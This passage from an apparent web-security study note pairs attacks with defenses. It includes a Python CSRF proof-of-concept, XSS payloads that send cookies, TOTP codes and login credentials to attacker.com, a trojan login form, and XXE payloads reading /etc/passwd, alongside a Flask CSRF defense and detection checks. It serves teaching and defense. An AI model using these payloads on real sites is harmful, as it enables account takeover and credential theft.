XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```python
#!/usr/bin/env python3
"""
CSRF Token Theft PoC — CSRF attack simulator using requests
(Educational purpose: verify behavior when CSRF token is not validated
or combined with XSS on vulnerable servers)

Usage: python3 csrf_poc.py -t http://target.com/account/change-password \
                            --victim-session "session=abc123" \
                            --new-password "hacked123"
"""
import argparse
import re
from typing import Optional

import requests


class CSRFTokenExtractor:
    """
    Class that extracts CSRF tokens from target pages using session cookies.
    In a real attack, an XSS payload performs this role in the victim's browser.
    """

    TOKEN_PATTERNS = [
        r'name=["\']csrf[_\-]?token["\'].*?value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'].*?name=["\']csrf[_\-]?token["\']',
        r'<meta\s+name=["\']csrf[_\-]?token["\'].*?content=["\']([^"\']+)["\']',
        r'"csrfToken"\s*:\s*"([^"]+)"',
        r'window\.__csrf\s*=\s*["\']([^"\']+)["\']',
        r'data-csrf=["\']([^"\']+)["\']',
    ]

    def __init__(self, session: requests.Session) -> None:
        self.session = session

    def extract(self, url: str) -> Optional[str]:
        resp = self.session.get(url, timeout=10)
        for pattern in self.TOKEN_PATTERNS:
            match = re.search(pattern, resp.text, re.IGNORECASE | re.DOTALL)
            if match:
                token = match.group(1)
                print(f"[+] CSRF token successfully stolen: {token[:30]}...")
                return token
        print(f"[-] CSRF token not found (request may be possible without token)")
        return None


def simulate_csrf_attack(
    target_url: str,
    victim_session: str,
    form_data: dict,
    referer_spoof: Optional[str] = None,
) -> None:
    """
    Simulate CSRF attack using victim's session.
    1. Extract CSRF token from original page using session
    2. Submit malicious form with extracted token
    """
    session = requests.Session()
    # Set victim session cookie
    for item in victim_session.split(";"):
        k, _, v = item.strip().partition("=")
        session.cookies.set(k.strip(), v.strip())

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (CSRF-PoC/1.0)",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    if referer_spoof:
        session.headers["Referer"] = referer_spoof

    # Attempt to extract CSRF token from original page
    extractor = CSRFTokenExtractor(session)
    token = extractor.extract(target_url)

    # Include token in form data (if found)
    if token:
        for possible_key in ("csrf_token", "csrftoken", "_token", "authenticity_token"):
            form_data[possible_key] = token
            break

    print(f"\n[*] Sending CSRF attack request: {target_url}")
    print(f"    Form data: {form_data}")

    resp = session.post(target_url, data=form_data, timeout=10,
                        allow_redirects=True)

    print(f"[*] Response code: {resp.status_code}")
    print(f"[*] Response size: {len(resp.text)} bytes")

    # Infer success (password change scenario)
    success_hints = ["success", "updated", "saved", "completed", "changed"]
    fail_hints    = ["invalid", "csrf", "forbidden", "403", "error"]

    body_lower = resp.text.lower()
    if any(h in body_lower for h in success_hints):
        print("[!] Attack likely succeeded (success keyword in response)")
    elif any(h in body_lower for h in fail_hints):
        print("[-] CSRF defense is active (failure keyword detected)")
    else:
        print("[?] Result unclear (manual response inspection needed)")


def main() -> None:
    parser = argparse.ArgumentParser(description="CSRF Attack Simulator (Educational)")
    parser.add_argument("-t", "--target", required=True,
                        help="Target URL (e.g.: http://target.com/change-password)")
    parser.add_argument("--victim-session", required=True,
                        help="Victim session cookie (e.g.: session=abc123)")
    parser.add_argument("--data", default="new_password=hacked123",
                        help="Form data to send (e.g.: field1=val1&field2=val2)")
    parser.add_argument("--referer", help="Forged Referer header")
    args = parser.parse_args()

    form_data = dict(
        pair.split("=", 1) for pair in args.data.split("&") if "=" in pair
    )
    simulate_csrf_attack(args.target, args.victim_session, form_data, args.referer)


if __name__ == "__main__":
    main()
```

### CSRF Defense Implementation

CSRF (Cross-Site Request Forgery) exploits a victim's authenticated state to send unintended requests. When the victim visits a page crafted by an attacker while logged in, requests are sent to the server with the victim's privileges.

```python
#!/usr/bin/env python3
"""
Flask CSRF Defense Implementation — Synchronizer Token Pattern + SameSite Cookies
"""
import secrets
import hashlib
import hmac
import time
from flask import Flask, request, session, abort, render_template_string, jsonify
from functools import wraps
from typing import Optional

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # Strong random secret key required

CSRF_TOKEN_LIFETIME = 3600  # 1 hour


def generate_csrf_token() -> str:
    """Generate a cryptographically secure CSRF token"""
    raw = secrets.token_urlsafe(32)
    timestamp = int(time.time())
    # HMAC signature → unforgeable
    sig = hmac.new(
        app.secret_key.encode(),
        f"{raw}:{timestamp}".encode(),
        hashlib.sha256,
    ).hexdigest()
    return f"{raw}:{timestamp}:{sig}"


def validate_csrf_token(token: Optional[str]) -> bool:
    """Validate CSRF token (signature + expiry time)"""
    if not token:
        return False
    try:
        raw, ts_str, sig = token.split(":", 2)
    except ValueError:
        return False

    timestamp = int(ts_str)
    if time.time() - timestamp > CSRF_TOKEN_LIFETIME:
        return False  # Expired

    expected_sig = hmac.new(
        app.secret_key.encode(),
        f"{raw}:{ts_str}".encode(),
        hashlib.sha256,
    ).hexdigest()
    return hmac.compare_digest(sig, expected_sig)  # Prevent timing attacks


def csrf_protect(f):
    """CSRF protection decorator — validates POST/PUT/DELETE requests"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ("POST", "PUT", "PATCH", "DELETE"):
            token = (
                request.form.get("csrf_token")
                or request.headers.get("X-CSRF-Token")
                or request.json.get("csrf_token") if request.is_json else None
            )
            if not validate_csrf_token(token):
                abort(403, "CSRF token is invalid")
        return f(*args, **kwargs)
    return decorated


@app.route("/api/token", methods=["GET"])
def get_csrf_token():
    token = generate_csrf_token()
    session["csrf_token"] = token
    resp = jsonify({"csrf_token": token})
    # Additional defense with SameSite=Strict
    resp.set_cookie("csrf_token", token, httponly=False,
                    samesite="Strict", secure=True)
    return resp


@app.route("/api/change-password", methods=["POST"])
@csrf_protect
def change_password():
    new_pw = request.json.get("new_password", "")
    if len(new_pw) < 8:
        abort(400, "Password must be at least 8 characters")
    # Actual logic...
    return jsonify({"status": "success"})
```

---

## 7. MFA Bypass via XSS

### How It Works
```
Accounts with MFA (Two-Factor Authentication) can also be bypassed via XSS
→ Since XSS runs in the victim's browser, the session is already authenticated

Attack flow:
1. Victim completes MFA and successfully logs in
2. Stored XSS payload executes in victim's browser
3. Already-authenticated session (cookie) is sent to attacker
4. Attacker accesses directly with session cookie (skipping MFA step)
```

### MFA Bypass XSS Scenarios

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in victims' browsers. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.

```javascript
// Scenario 1: Session cookie theft (when HttpOnly is absent)
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

// Scenario 2: Auto-capture TOTP code (if input form is present)
<script>
  document.getElementById('totp-input').addEventListener('input', function(e) {
    fetch('https://attacker.com/totp?code=' + e.target.value);
  });
</script>

// Scenario 3: Fake MFA popup for phishing
<script>
  var overlay = document.createElement('div');
  overlay.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999">
      <div style="background:white;margin:20% auto;padding:30px;width:300px;text-align:center">
        <h3>Security Verification</h3>
        <p>Please enter your OTP code</p>
        <input id="fake-otp" type="text">
        <button onclick="steal()">Confirm</button>
      </div>
    </div>`;
  document.body.appendChild(overlay);
  
  function steal() {
    var code = document.getElementById('fake-otp').value;
    fetch('https://attacker.com/mfa?code=' + code);
  }
</script>

// Scenario 4: Password change (CSRF + XSS chaining)
<script>
  // Obtain CSRF token via XSS then change password
  fetch('/account/settings')
    .then(r => r.text())
    .then(html => {
      var token = html.match(/csrf_token.*?value="([^"]+)"/)[1];
      return fetch('/account/change-password', {
        method: 'POST',
        body: 'csrf_token=' + token + '&new_password=hacked123',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
      });
    });
</script>
```

---

## 8. Context-Specific XSS Encoding Strategies

### Attack Methods Based on Injection Location
```html
<!-- 1. HTML element context -->
<div>user_input</div>
Attack: <script>alert(1)</script>
Defense: HTML entity encoding (&lt; &gt; &amp;)

<!-- 2. HTML attribute context -->
<input value="user_input">
Attack: " onmouseover="alert(1)
Defense: Require quotes for attribute values + encode " → &quot;

<!-- 3. JavaScript context -->
<script>var x = 'user_input'</script>
Attack: '; alert(1); var y='
Defense: JSON.stringify() + ' → \x27

<!-- 4. URL context -->
<a href="user_input">
Attack: javascript:alert(1)
Defense: URL scheme whitelist (only allow http/https)

<!-- 5. CSS context -->
<div style="color: user_input">
Attack: expression(alert(1))  (IE), url('javascript:...')
Defense: Validate value through CSS parser

<!-- 6. In JSON response -->
{"message": "user_input"}
→ DOM XSS possible when HTML-rendered
Defense: HTML-encode JSON responses as well
```

### Trojan Login Panel (Login Defacement)
```javascript
// Tamper actual login form to submit to attacker's server
<script>
  // Change action attribute of real form
  var loginForm = document.querySelector('form[action*="login"]');
  if (loginForm) {
    loginForm.action = 'https://attacker.com/capture';
  }
  
  // Or replace entire page
  document.body.innerHTML = `
    <form method="POST" action="https://attacker.com/steal">
      <input name="username" placeholder="Username">
      <input name="password" type="password" placeholder="Password">
      <button>Login</button>
    </form>`;
</script>
```

---

## 9. Advanced XXE (Billion Laughs + SAML Attacks)

### Billion Laughs DoS Variant

The XML Billion Laughs attack (XML bomb) causes DoS by consuming memory exponentially through nested entity references.

```xml
<!-- Exponential expansion attack -->
<?xml version="1.0"?>
<!DOCTYPE billion [
  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">  <!-- hundreds of bytes -->
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">   <!-- 10x -->
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">   <!-- 100x -->
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">   <!-- 1000x -->
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">   <!-- 10000x -->
]>
<data>&e;</data>
<!-- When parser expands &e;, consumes several GB of memory → OOM or 100% CPU -->
```

### SAML XXE — SSO Attack
```
SAML (Security Assertion Markup Language):
XML-based authentication protocol used for enterprise SSO

Attack flow:
1. SP (Service Provider) sends authentication request to IdP
2. IdP issues SAML Response (XML)
3. SAML Response passed to SP (Base64-encoded)
4. ↑ At this stage: man-in-the-middle attack or client-side tampering

Vulnerable scenario:
```
```bash
# Capture SAML Response (Burp Suite)
# Extract SAMLResponse= parameter value

# Base64 decode
echo "SAMLResponse_value" | base64 -d > saml.xml

# Insert XXE payload
# Add DOCTYPE declaration before <samlp:Response ...>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

# Re-encode to Base64
cat saml_modified.xml | base64 -w0

# Send tampered SAMLResponse → Server reads /etc/passwd during SAML processing
```

XXE (XML External Entity) injection exploits the external entity processing feature of XML parsers as a web vulnerability.

```xml
<!-- Tampered SAML Response -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer>&xxe;</saml:Issuer>
  ...
</samlp:Response>
```

<!-- detect-validate-05 -->
## XSS/CSRF/Upload Detection and Defense Validation

XSS, CSRF, and file-upload attacks describe *how to execute/forge/plant*, but defenders must verify **where they are caught (CSP violation, missing token, file signature)** and **whether output encoding, CSRF tokens, and magic-byte checks actually block**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Attack | Targeted layer | Primary control (prevent) | Detection signal |
|---|---|---|---|
| Stored/reflected XSS | Output rendering | Output encoding, CSP | CSP violation reports, `<script>`-like input |
| DOM XSS | Client sink | Safe DOM API, Trusted Types | `innerHTML`/`eval` sink usage |
| CSRF | State-changing request | CSRF token, SameSite | Token-less POST, external Referer |
| Malicious upload | Content handling | Magic-byte/extension check | content-type mismatch, webshell signature |

### Defense validation (verify directly)

```bash
# 1) Confirm CSP header is actually sent (own server) — absence means no XSS mitigation
curl -sI https://localhost/ | grep -i 'content-security-policy' || echo 'NO CSP HEADER'
# 2) Verify uploads are validated by magic bytes, not extension
file --mime-type uploaded.bin   # confirm real type even if it claims image/png
# 3) Check state-changing forms include a CSRF token
curl -s https://localhost/transfer | grep -iq 'csrf' && echo 'CSRF token present' || echo 'NO CSRF TOKEN'
```

> Validate only on **owned servers / controlled environments**. "Added encoding/tokens" differs from "actually blocks the payload" — reproduce XSS/CSRF/webshell PoCs to confirm controls block ([[13_SOC_Blue_Team]], [[68_Purple_Team]]).
